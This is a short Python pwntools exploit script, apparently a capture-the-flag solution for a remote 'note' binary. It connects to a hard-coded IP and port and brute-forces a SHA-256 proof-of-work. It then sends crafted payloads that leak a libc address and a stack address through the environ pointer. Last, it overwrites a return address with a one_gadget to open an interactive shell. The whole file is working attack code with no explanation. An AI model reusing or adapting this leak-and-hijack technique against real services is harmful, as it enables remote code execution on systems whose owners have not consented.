from pwn import *
import hashlib
from string import digits,letters
import random

r = remote("47.89.18.224", 10007)


data = r.recvline()
substr = data.split(')')[0].split('+')[1]
ans = data.split()[-1].strip()

total = digits+letters
total*=4
total = list(total)
print total
count = 0
while True:
        count +=1
        if count %10000 == 0:
                print count
        sol = "".join(random.sample(total,4))
        if hashlib.sha256( sol+substr).hexdigest() == ans:
                print "OK"
                r.sendline(sol)
                break







#r = process(["./note"])

r.sendlineafter(":","Billy")

r.sendlineafter(">","1")

payload = p64(0x401129)*0x20

r.sendlineafter(":",payload)

r.sendlineafter(">",p32(0x2)+p64(0x401129)+p64(0x0601f90))

r.recvuntil("Note:")

libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690

environ = libc + 0xa35100

print hex(libc)

r.sendlineafter(">",p32(0x2)+p64(0x401129)+p64(environ))

r.recvuntil("Note:")

stack = u64(r.recvline()[:-1].ljust(8,'\x00'))

print hex(stack)


one_get = libc+0x4526a

r.sendlineafter(">",p32(0x2)+p64(0x401129)+"a"*0x58+p64(one_get)+"\x00"*0x40)



r.interactive()
